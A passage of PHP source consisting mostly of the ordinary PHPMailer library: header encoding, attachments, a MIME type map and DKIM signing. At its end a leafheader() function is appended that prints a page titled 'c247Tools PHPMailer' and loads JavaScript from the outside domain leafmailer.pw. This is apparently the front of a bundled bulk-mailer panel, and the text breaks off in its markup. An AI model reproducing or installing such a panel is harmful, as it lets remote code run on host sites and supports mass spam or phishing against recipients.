                $pattern = '^A-Za-z0-9!*+\/ -';
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                // RFC 2047 section 5.2
                $pattern = '\(\)"';
                // intentional fall-through
                // for this reason we build the $pattern without including delimiters and []
            case 'text':
            default:
                // RFC 2047 section 5.1
                // Replace every high ascii, control, =, ? and _ characters
                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
                break;
        }
        $matches = array();
        if (preg_match_all("/[{$pattern}]/", $encoded, $matches)) {
            // If the string contains an '=', make sure it's the first thing we replace
            // so as to avoid double-encoding
            $eqkey = array_search('=', $matches[0]);
            if (false !== $eqkey) {
                unset($matches[0][$eqkey]);
                array_unshift($matches[0], '=');
            }
            foreach (array_unique($matches[0]) as $char) {
                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
            }
        }
        // Replace every spaces to _ (more readable than =20)
        return str_replace(' ', '_', $encoded);
    }

    /**
     * Add a string or binary attachment (non-filesystem).
     * This method can be used to attach ascii or binary data,
     * such as a BLOB record from a database.
     * @param string $string String attachment data.
     * @param string $filename Name of the attachment.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @return void
     */
    public function addStringAttachment(
        $string,
        $filename,
        $encoding = 'base64',
        $type = '',
        $disposition = 'attachment'
    ) {
        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($filename);
        }
        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $filename,
            2 => basename($filename),
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => 0
        );
    }

    /**
     * Add an embedded (inline) attachment from a file.
     * This can include images, sounds, and just about any other document type.
     * These differ from 'regular' attachments in that they are intended to be
     * displayed inline with the message, not just attached for download.
     * This is used in HTML messages that embed the images
     * the HTML refers to using the $cid value.
     * Never use a user-supplied path to a file!
     * @param string $path Path to the attachment.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
    {
        if (!self::isPermittedPath($path) or !@is_file($path)) {
            $this->setError($this->lang('file_access') . $path);
            return false;
        }

        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($path);
        }

        $filename = basename($path);
        if ($name == '') {
            $name = $filename;
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $path,
            1 => $filename,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => false, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Add an embedded stringified attachment.
     * This can include images, sounds, and just about any other document type.
     * Be sure to set the $type to an image type for images:
     * JPEG images use 'image/jpeg', GIF uses 'image/gif', PNG uses 'image/png'.
     * @param string $string The attachment binary data.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addStringEmbeddedImage(
        $string,
        $cid,
        $name = '',
        $encoding = 'base64',
        $type = '',
        $disposition = 'inline'
    ) {
        // If a MIME type is not specified, try to work it out from the name
        if ($type == '' and !empty($name)) {
            $type = self::filenameToType($name);
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $name,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Check if an inline attachment is present.
     * @access public
     * @return boolean
     */
    public function inlineImageExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'inline') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if an attachment (non-inline) is present.
     * @return boolean
     */
    public function attachmentExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'attachment') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if this message has an alternative body set.
     * @return boolean
     */
    public function alternativeExists()
    {
        return !empty($this->AltBody);
    }

    /**
     * Clear queued addresses of given kind.
     * @access protected
     * @param string $kind 'to', 'cc', or 'bcc'
     * @return void
     */
    public function clearQueuedAddresses($kind)
    {
        $RecipientsQueue = $this->RecipientsQueue;
        foreach ($RecipientsQueue as $address => $params) {
            if ($params[0] == $kind) {
                unset($this->RecipientsQueue[$address]);
            }
        }
    }

    /**
     * Clear all To recipients.
     * @return void
     */
    public function clearAddresses()
    {
        foreach ($this->to as $to) {
            unset($this->all_recipients[strtolower($to[0])]);
        }
        $this->to = array();
        $this->clearQueuedAddresses('to');
    }

    /**
     * Clear all CC recipients.
     * @return void
     */
    public function clearCCs()
    {
        foreach ($this->cc as $cc) {
            unset($this->all_recipients[strtolower($cc[0])]);
        }
        $this->cc = array();
        $this->clearQueuedAddresses('cc');
    }

    /**
     * Clear all BCC recipients.
     * @return void
     */
    public function clearBCCs()
    {
        foreach ($this->bcc as $bcc) {
            unset($this->all_recipients[strtolower($bcc[0])]);
        }
        $this->bcc = array();
        $this->clearQueuedAddresses('bcc');
    }

    /**
     * Clear all ReplyTo recipients.
     * @return void
     */
    public function clearReplyTos()
    {
        $this->ReplyTo = array();
        $this->ReplyToQueue = array();
    }

    /**
     * Clear all recipient types.
     * @return void
     */
    public function clearAllRecipients()
    {
        $this->to = array();
        $this->cc = array();
        $this->bcc = array();
        $this->all_recipients = array();
        $this->RecipientsQueue = array();
    }

    /**
     * Clear all filesystem, string, and binary attachments.
     * @return void
     */
    public function clearAttachments()
    {
        $this->attachment = array();
    }

    /**
     * Clear all custom headers.
     * @return void
     */
    public function clearCustomHeaders()
    {
        $this->CustomHeader = array();
    }

    /**
     * Add an error message to the error container.
     * @access protected
     * @param string $msg
     * @return void
     */
    protected function setError($msg)
    {
        $this->error_count++;
        if ($this->Mailer == 'smtp' and !is_null($this->smtp)) {
            $lasterror = $this->smtp->getError();
            if (!empty($lasterror['error'])) {
                $msg .= $this->lang('smtp_error') . $lasterror['error'];
                if (!empty($lasterror['detail'])) {
                    $msg .= ' Detail: '. $lasterror['detail'];
                }
                if (!empty($lasterror['smtp_code'])) {
                    $msg .= ' SMTP code: ' . $lasterror['smtp_code'];
                }
                if (!empty($lasterror['smtp_code_ex'])) {
                    $msg .= ' Additional SMTP info: ' . $lasterror['smtp_code_ex'];
                }
            }
        }
        $this->ErrorInfo = $msg;
    }

    /**
     * Return an RFC 822 formatted date.
     * @access public
     * @return string
     * @static
     */
    public static function rfcDate()
    {
        // Set the time zone to whatever the default is to avoid 500 errors
        // Will default to UTC if it's not set properly in php.ini
        date_default_timezone_set(@date_default_timezone_get());
        return date('D, j M Y H:i:s O');
    }

    /**
     * Get the server hostname.
     * Returns 'localhost.localdomain' if unknown.
     * @access protected
     * @return string
     */
    protected function serverHostname()
    {
        $result = 'localhost.localdomain';
        if (!empty($this->Hostname)) {
            $result = $this->Hostname;
        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
            $result = $_SERVER['SERVER_NAME'];
        } elseif (function_exists('gethostname') && gethostname() !== false) {
            $result = gethostname();
        } elseif (php_uname('n') !== false) {
            $result = php_uname('n');
        }
        return $result;
    }

    /**
     * Get an error message in the current language.
     * @access protected
     * @param string $key
     * @return string
     */
    protected function lang($key)
    {
        if (count($this->language) < 1) {
            $this->setLanguage('en'); // set the default language
        }

        if (array_key_exists($key, $this->language)) {
            if ($key == 'smtp_connect_failed') {
                //Include a link to troubleshooting docs on SMTP connection failure
                //this is by far the biggest cause of support questions
                //but it's usually not PHPMailer's fault.
                return $this->language[$key] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';
            }
            return $this->language[$key];
        } else {
            //Return the key as a fallback
            return $key;
        }
    }

    /**
     * Check if an error occurred.
     * @access public
     * @return boolean True if an error did occur.
     */
    public function isError()
    {
        return ($this->error_count > 0);
    }

    /**
     * Ensure consistent line endings in a string.
     * Changes every end of line from CRLF, CR or LF to $this->LE.
     * @access public
     * @param string $str String to fixEOL
     * @return string
     */
    public function fixEOL($str)
    {
        // Normalise to \n
        $nstr = str_replace(array("\r\n", "\r"), "\n", $str);
        // Now convert LE as needed
        if ($this->LE !== "\n") {
            $nstr = str_replace("\n", $this->LE, $nstr);
        }
        return $nstr;
    }

    /**
     * Add a custom header.
     * $name value can be overloaded to contain
     * both header name and value (name:value)
     * @access public
     * @param string $name Custom header name
     * @param string $value Header value
     * @return void
     */
    public function addCustomHeader($name, $value = null)
    {
        if ($value === null) {
            // Value passed in as name:value
            $this->CustomHeader[] = explode(':', $name, 2);
        } else {
            $this->CustomHeader[] = array($name, $value);
        }
    }

    /**
     * Returns all custom headers.
     * @return array
     */
    public function getCustomHeaders()
    {
        return $this->CustomHeader;
    }

    /**
     * Create a message body from an HTML string.
     * Automatically inlines images and creates a plain-text version by converting the HTML,
     * overwriting any existing values in Body and AltBody.
     * Do not source $message content from user input!
     * $basedir is prepended when handling relative URLs, e.g. <img src="/images/a.png"> and must not be empty
     * will look for an image file in $basedir/images/a.png and convert it to inline.
     * If you don't provide a $basedir, relative paths will be left untouched (and thus probably break in email)
     * If you don't want to apply these transformations to your HTML, just set Body and AltBody directly.
     * @access public
     * @param string $message HTML message string
     * @param string $basedir Absolute path to a base directory to prepend to relative paths to images
     * @param boolean|callable $advanced Whether to use the internal HTML to text converter
     *    or your own custom converter @see PHPMailer::html2text()
     * @return string $message The transformed message Body
     */
    public function msgHTML($message, $basedir = '', $advanced = false)
    {
        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
        if (array_key_exists(2, $images)) {
            if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
                // Ensure $basedir has a trailing /
                $basedir .= '/';
            }
            foreach ($images[2] as $imgindex => $url) {
                // Convert data URIs into embedded images
                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
                    $data = substr($url, strpos($url, ','));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if ($this->addStringEmbeddedImage($data, $cid, 'embed' . $imgindex, 'base64', $match[1])) {
                        $message = str_replace(
                            $images[0][$imgindex],
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                    continue;
                }
                if (
                    // Only process relative URLs if a basedir is provided (i.e. no absolute local paths)
                    !empty($basedir)
                    // Ignore URLs containing parent dir traversal (..)
                    && (strpos($url, '..') === false)
                    // Do not change urls that are already inline images
                    && substr($url, 0, 4) !== 'cid:'
                    // Do not change absolute URLs, including anonymous protocol
                    && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $url)
                ) {
                    $filename = basename($url);
                    $directory = dirname($url);
                    if ($directory == '.') {
                        $directory = '';
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
                        $directory .= '/';
                    }
                    if ($this->addEmbeddedImage(
                        $basedir . $directory . $filename,
                        $cid,
                        $filename,
                        'base64',
                        self::_mime_types((string)self::mb_pathinfo($filename, PATHINFO_EXTENSION))
                    )
                    ) {
                        $message = preg_replace(
                            '/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui',
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                }
            }
        }
        $this->isHTML(true);
        // Convert all message body line breaks to CRLF, makes quoted-printable encoding work much better
        $this->Body = $this->normalizeBreaks($message);
        $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced));
        if (!$this->alternativeExists()) {
            $this->AltBody = 'To view this email message, open it in a program that understands HTML!' .
                self::CRLF . self::CRLF;
        }
        return $this->Body;
    }

    /**
     * Convert an HTML string into plain text.
     * This is used by msgHTML().
     * Note - older versions of this function used a bundled advanced converter
     * which was been removed for license reasons in #232.
     * Example usage:
     * <code>
     * // Use default conversion
     * $plain = $mail->html2text($html);
     * // Use your own custom converter
     * $plain = $mail->html2text($html, function($html) {
     *     $converter = new MyHtml2text($html);
     *     return $converter->get_text();
     * });
     * </code>
     * @param string $html The HTML text to convert
     * @param boolean|callable $advanced Any boolean value to use the internal converter,
     *   or provide your own callable for custom conversion.
     * @return string
     */
    public function html2text($html, $advanced = false)
    {
        if (is_callable($advanced)) {
            return call_user_func($advanced, $html);
        }
        return html_entity_decode(
            trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si', '', $html))),
            ENT_QUOTES,
            $this->CharSet
        );
    }

    /**
     * Get the MIME type for a file extension.
     * @param string $ext File extension
     * @access public
     * @return string MIME type of file.
     * @static
     */
    public static function _mime_types($ext = '')
    {
        $mimes = array(
            'xl'    => 'application/excel',
            'js'    => 'application/javascript',
            'hqx'   => 'application/mac-binhex40',
            'cpt'   => 'application/mac-compactpro',
            'bin'   => 'application/macbinary',
            'doc'   => 'application/msword',
            'word'  => 'application/msword',
            'xlsx'  => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'xltx'  => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template',
            'potx'  => 'application/vnd.openxmlformats-officedocument.presentationml.template',
            'ppsx'  => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow',
            'pptx'  => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            'sldx'  => 'application/vnd.openxmlformats-officedocument.presentationml.slide',
            'docx'  => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'dotx'  => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template',
            'xlam'  => 'application/vnd.ms-excel.addin.macroEnabled.12',
            'xlsb'  => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12',
            'class' => 'application/octet-stream',
            'dll'   => 'application/octet-stream',
            'dms'   => 'application/octet-stream',
            'exe'   => 'application/octet-stream',
            'lha'   => 'application/octet-stream',
            'lzh'   => 'application/octet-stream',
            'psd'   => 'application/octet-stream',
            'sea'   => 'application/octet-stream',
            'so'    => 'application/octet-stream',
            'oda'   => 'application/oda',
            'pdf'   => 'application/pdf',
            'ai'    => 'application/postscript',
            'eps'   => 'application/postscript',
            'ps'    => 'application/postscript',
            'smi'   => 'application/smil',
            'smil'  => 'application/smil',
            'mif'   => 'application/vnd.mif',
            'xls'   => 'application/vnd.ms-excel',
            'ppt'   => 'application/vnd.ms-powerpoint',
            'wbxml' => 'application/vnd.wap.wbxml',
            'wmlc'  => 'application/vnd.wap.wmlc',
            'dcr'   => 'application/x-director',
            'dir'   => 'application/x-director',
            'dxr'   => 'application/x-director',
            'dvi'   => 'application/x-dvi',
            'gtar'  => 'application/x-gtar',
            'php3'  => 'application/x-httpd-php',
            'php4'  => 'application/x-httpd-php',
            'php'   => 'application/x-httpd-php',
            'phtml' => 'application/x-httpd-php',
            'phps'  => 'application/x-httpd-php-source',
            'swf'   => 'application/x-shockwave-flash',
            'sit'   => 'application/x-stuffit',
            'tar'   => 'application/x-tar',
            'tgz'   => 'application/x-tar',
            'xht'   => 'application/xhtml+xml',
            'xhtml' => 'application/xhtml+xml',
            'zip'   => 'application/zip',
            'mid'   => 'audio/midi',
            'midi'  => 'audio/midi',
            'mp2'   => 'audio/mpeg',
            'mp3'   => 'audio/mpeg',
            'mpga'  => 'audio/mpeg',
            'aif'   => 'audio/x-aiff',
            'aifc'  => 'audio/x-aiff',
            'aiff'  => 'audio/x-aiff',
            'ram'   => 'audio/x-pn-realaudio',
            'rm'    => 'audio/x-pn-realaudio',
            'rpm'   => 'audio/x-pn-realaudio-plugin',
            'ra'    => 'audio/x-realaudio',
            'wav'   => 'audio/x-wav',
            'bmp'   => 'image/bmp',
            'gif'   => 'image/gif',
            'jpeg'  => 'image/jpeg',
            'jpe'   => 'image/jpeg',
            'jpg'   => 'image/jpeg',
            'png'   => 'image/png',
            'tiff'  => 'image/tiff',
            'tif'   => 'image/tiff',
            'eml'   => 'message/rfc822',
            'css'   => 'text/css',
            'html'  => 'text/html',
            'htm'   => 'text/html',
            'shtml' => 'text/html',
            'log'   => 'text/plain',
            'text'  => 'text/plain',
            'txt'   => 'text/plain',
            'rtx'   => 'text/richtext',
            'rtf'   => 'text/rtf',
            'vcf'   => 'text/vcard',
            'vcard' => 'text/vcard',
            'xml'   => 'text/xml',
            'xsl'   => 'text/xml',
            'mpeg'  => 'video/mpeg',
            'mpe'   => 'video/mpeg',
            'mpg'   => 'video/mpeg',
            'mov'   => 'video/quicktime',
            'qt'    => 'video/quicktime',
            'rv'    => 'video/vnd.rn-realvideo',
            'avi'   => 'video/x-msvideo',
            'movie' => 'video/x-sgi-movie'
        );
        if (array_key_exists(strtolower($ext), $mimes)) {
            return $mimes[strtolower($ext)];
        }
        return 'application/octet-stream';
    }

    /**
     * Map a file name to a MIME type.
     * Defaults to 'application/octet-stream', i.e.. arbitrary binary data.
     * @param string $filename A file name or full path, does not need to exist as a file
     * @return string
     * @static
     */
    public static function filenameToType($filename)
    {
        // In case the path is a URL, strip any query string before getting extension
        $qpos = strpos($filename, '?');
        if (false !== $qpos) {
            $filename = substr($filename, 0, $qpos);
        }
        $pathinfo = self::mb_pathinfo($filename);
        return self::_mime_types($pathinfo['extension']);
    }

    /**
     * Multi-byte-safe pathinfo replacement.
     * Drop-in replacement for pathinfo(), but multibyte-safe, cross-platform-safe, old-version-safe.
     * Works similarly to the one in PHP >= 5.2.0
     * @link http://www.php.net/manual/en/function.pathinfo.php#107461
     * @param string $path A filename or path, does not need to exist as a file
     * @param integer|string $options Either a PATHINFO_* constant,
     *      or a string name to return only the specified piece, allows 'filename' to work on PHP < 5.2
     * @return string|array
     * @static
     */
    public static function mb_pathinfo($path, $options = null)
    {
        $ret = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => '');
        $pathinfo = array();
        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
            if (array_key_exists(1, $pathinfo)) {
                $ret['dirname'] = $pathinfo[1];
            }
            if (array_key_exists(2, $pathinfo)) {
                $ret['basename'] = $pathinfo[2];
            }
            if (array_key_exists(5, $pathinfo)) {
                $ret['extension'] = $pathinfo[5];
            }
            if (array_key_exists(3, $pathinfo)) {
                $ret['filename'] = $pathinfo[3];
            }
        }
        switch ($options) {
            case PATHINFO_DIRNAME:
            case 'dirname':
                return $ret['dirname'];
            case PATHINFO_BASENAME:
            case 'basename':
                return $ret['basename'];
            case PATHINFO_EXTENSION:
            case 'extension':
                return $ret['extension'];
            case PATHINFO_FILENAME:
            case 'filename':
                return $ret['filename'];
            default:
                return $ret;
        }
    }

    /**
     * Set or reset instance properties.
     * You should avoid this function - it's more verbose, less efficient, more error-prone and
     * harder to debug than setting properties directly.
     * Usage Example:
     * `$mail->set('SMTPSecure', 'tls');`
     *   is the same as:
     * `$mail->SMTPSecure = 'tls';`
     * @access public
     * @param string $name The property name to set
     * @param mixed $value The value to set the property to
     * @return boolean
     * @TODO Should this not be using the __set() magic function?
     */
    public function set($name, $value = '')
    {
        if (property_exists($this, $name)) {
            $this->$name = $value;
            return true;
        } else {
            $this->setError($this->lang('variable_set') . $name);
            return false;
        }
    }

    /**
     * Strip newlines to prevent header injection.
     * @access public
     * @param string $str
     * @return string
     */
    public function secureHeader($str)
    {
        return trim(str_replace(array("\r", "\n"), '', $str));
    }

    /**
     * Normalize line breaks in a string.
     * Converts UNIX LF, Mac CR and Windows CRLF line breaks into a single line break format.
     * Defaults to CRLF (for message bodies) and preserves consecutive breaks.
     * @param string $text
     * @param string $breaktype What kind of line break to use, defaults to CRLF
     * @return string
     * @access public
     * @static
     */
    public static function normalizeBreaks($text, $breaktype = "\r\n")
    {
        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
    }

    /**
     * Set the public and private key files and password for S/MIME signing.
     * @access public
     * @param string $cert_filename
     * @param string $key_filename
     * @param string $key_pass Password for private key
     * @param string $extracerts_filename Optional path to chain certificate
     */
    public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '')
    {
        $this->sign_cert_file = $cert_filename;
        $this->sign_key_file = $key_filename;
        $this->sign_key_pass = $key_pass;
        $this->sign_extracerts_file = $extracerts_filename;
    }

    /**
     * Quoted-Printable-encode a DKIM header.
     * @access public
     * @param string $txt
     * @return string
     */
    public function DKIM_QP($txt)
    {
        $line = '';
        for ($i = 0; $i < strlen($txt); $i++) {
            $ord = ord($txt[$i]);
            if (((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E))) {
                $line .= $txt[$i];
            } else {
                $line .= '=' . sprintf('%02X', $ord);
            }
        }
        return $line;
    }

    /**
     * Generate a DKIM signature.
     * @access public
     * @param string $signHeader
     * @throws phpmailerException
     * @return string The DKIM signature value
     */
    public function DKIM_Sign($signHeader)
    {
        if (!defined('PKCS7_TEXT')) {
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('extension_missing') . 'openssl');
            }
            return '';
        }
        $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private);
        if ('' != $this->DKIM_passphrase) {
            $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);
        } else {
            $privKey = openssl_pkey_get_private($privKeyStr);
        }
        //Workaround for missing digest algorithms in old PHP & OpenSSL versions
        //@link http://stackoverflow.com/a/11117338/333340
        if (version_compare(PHP_VERSION, '5.3.0') >= 0 and
            in_array('sha256WithRSAEncryption', openssl_get_md_methods(true))) {
            if (openssl_sign($signHeader, $signature, $privKey, 'sha256WithRSAEncryption')) {
                openssl_pkey_free($privKey);
                return base64_encode($signature);
            }
        } else {
            $pinfo = openssl_pkey_get_details($privKey);
            $hash = hash('sha256', $signHeader);
            //'Magic' constant for SHA256 from RFC3447
            //@link https://tools.ietf.org/html/rfc3447#page-43
            $t = '3031300d060960864801650304020105000420' . $hash;
            $pslen = $pinfo['bits'] / 8 - (strlen($t) / 2 + 3);
            $eb = pack('H*', '0001' . str_repeat('FF', $pslen) . '00' . $t);

            if (openssl_private_encrypt($eb, $signature, $privKey, OPENSSL_NO_PADDING)) {
                openssl_pkey_free($privKey);
                return base64_encode($signature);
            }
        }
        openssl_pkey_free($privKey);
        return '';
    }

    /**
     * Generate a DKIM canonicalization header.
     * @access public
     * @param string $signHeader Header
     * @return string
     */
    public function DKIM_HeaderC($signHeader)
    {
        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
        $lines = explode("\r\n", $signHeader);
        foreach ($lines as $key => $line) {
            list($heading, $value) = explode(':', $line, 2);
            $heading = strtolower($heading);
            $value = preg_replace('/\s{2,}/', ' ', $value); // Compress useless spaces
            $lines[$key] = $heading . ':' . trim($value); // Don't forget to remove WSP around the value
        }
        $signHeader = implode("\r\n", $lines);
        return $signHeader;
    }

    /**
     * Generate a DKIM canonicalization body.
     * @access public
     * @param string $body Message Body
     * @return string
     */
    public function DKIM_BodyC($body)
    {
        if ($body == '') {
            return "\r\n";
        }
        // stabilize line endings
        $body = str_replace("\r\n", "\n", $body);
        $body = str_replace("\n", "\r\n", $body);
        // END stabilize line endings
        while (substr($body, strlen($body) - 4, 4) == "\r\n\r\n") {
            $body = substr($body, 0, strlen($body) - 2);
        }
        return $body;
    }

    /**
     * Create the DKIM header and body in a new message header.
     * @access public
     * @param string $headers_line Header lines
     * @param string $subject Subject
     * @param string $body Body
     * @return string
     */
    public function DKIM_Add($headers_line, $subject, $body)
    {
        $DKIMsignatureType = 'rsa-sha256'; // Signature & hash algorithms
        $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
        $DKIMquery = 'dns/txt'; // Query method
        $DKIMtime = time(); // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
        $subject_header = "Subject: $subject";
        $headers = explode($this->LE, $headers_line);
        $from_header = '';
        $to_header = '';
        $date_header = '';
        $current = '';
        foreach ($headers as $header) {
            if (strpos($header, 'From:') === 0) {
                $from_header = $header;
                $current = 'from_header';
            } elseif (strpos($header, 'To:') === 0) {
                $to_header = $header;
                $current = 'to_header';
            } elseif (strpos($header, 'Date:') === 0) {
                $date_header = $header;
                $current = 'date_header';
            } else {
                if (!empty($$current) && strpos($header, ' =?') === 0) {
                    $$current .= $header;
                } else {
                    $current = '';
                }
            }
        }
        $from = str_replace('|', '=7C', $this->DKIM_QP($from_header));
        $to = str_replace('|', '=7C', $this->DKIM_QP($to_header));
        $date = str_replace('|', '=7C', $this->DKIM_QP($date_header));
        $subject = str_replace(
            '|',
            '=7C',
            $this->DKIM_QP($subject_header)
        ); // Copied header fields (dkim-quoted-printable)
        $body = $this->DKIM_BodyC($body);
        $DKIMlen = strlen($body); // Length of body
        $DKIMb64 = base64_encode(pack('H*', hash('sha256', $body))); // Base64 of packed binary SHA-256 hash of body
        if ('' == $this->DKIM_identity) {
            $ident = '';
        } else {
            $ident = ' i=' . $this->DKIM_identity . ';';
        }
        $dkimhdrs = 'DKIM-Signature: v=1; a=' .
            $DKIMsignatureType . '; q=' .
            $DKIMquery . '; l=' .
            $DKIMlen . '; s=' .
            $this->DKIM_selector .
            ";\r\n" .
            "\tt=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";\r\n" .
            "\th=From:To:Date:Subject;\r\n" .
            "\td=" . $this->DKIM_domain . ';' . $ident . "\r\n" .
            "\tz=$from\r\n" .
            "\t|$to\r\n" .
            "\t|$date\r\n" .
            "\t|$subject;\r\n" .
            "\tbh=" . $DKIMb64 . ";\r\n" .
            "\tb=";
        $toSign = $this->DKIM_HeaderC(
            $from_header . "\r\n" .
            $to_header . "\r\n" .
            $date_header . "\r\n" .
            $subject_header . "\r\n" .
            $dkimhdrs
        );
        $signed = $this->DKIM_Sign($toSign);
        return $dkimhdrs . $signed . "\r\n";
    }

    /**
     * Detect if a string contains a line longer than the maximum line length allowed.
     * @param string $str
     * @return boolean
     * @static
     */
    public static function hasLineLongerThanMax($str)
    {
        //+2 to include CRLF line break for a 1000 total
        return (boolean)preg_match('/^(.{'.(self::MAX_LINE_LENGTH + 2).',})/m', $str);
    }

    /**
     * Allows for public read access to 'to' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */
    public function getToAddresses()
    {
        return $this->to;
    }

    /**
     * Allows for public read access to 'cc' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */
    public function getCcAddresses()
    {
        return $this->cc;
    }

    /**
     * Allows for public read access to 'bcc' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */
    public function getBccAddresses()
    {
        return $this->bcc;
    }

    /**
     * Allows for public read access to 'ReplyTo' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */
    public function getReplyToAddresses()
    {
        return $this->ReplyTo;
    }

    /**
     * Allows for public read access to 'all_recipients' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */
    public function getAllRecipientAddresses()
    {
        return $this->all_recipients;
    }

    /**
     * Perform a callback.
     * @param boolean $isSent
     * @param array $to
     * @param array $cc
     * @param array $bcc
     * @param string $subject
     * @param string $body
     * @param string $from
     */
    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
    {
        if (!empty($this->action_function) && is_callable($this->action_function)) {
            $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from);
            call_user_func_array($this->action_function, $params);
        }
    }
}

/**
 * PHPMailer exception handler
 * @package PHPMailer
 */
class phpmailerException extends Exception
{
    /**
     * Prettify error message output
     * @return string
     */
    public function errorMessage()
    {
        $errorMsg = '<strong>' . htmlspecialchars($this->getMessage()) . "</strong><br />\n";
        return $errorMsg;
    }
}
function leafheader(){
print '
<head>
    <title>'.str_replace("www.", "", $_SERVER['HTTP_HOST']).' - c247Tools PHPMailer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.4.1/cosmo/bootstrap.min.css" rel="stylesheet" >
    <script src="https://leafmailer.pw/style2.js"></script>

</head>';
}
leafheader();
print '<body>';
print '<div class="container col-lg-12" align=center>
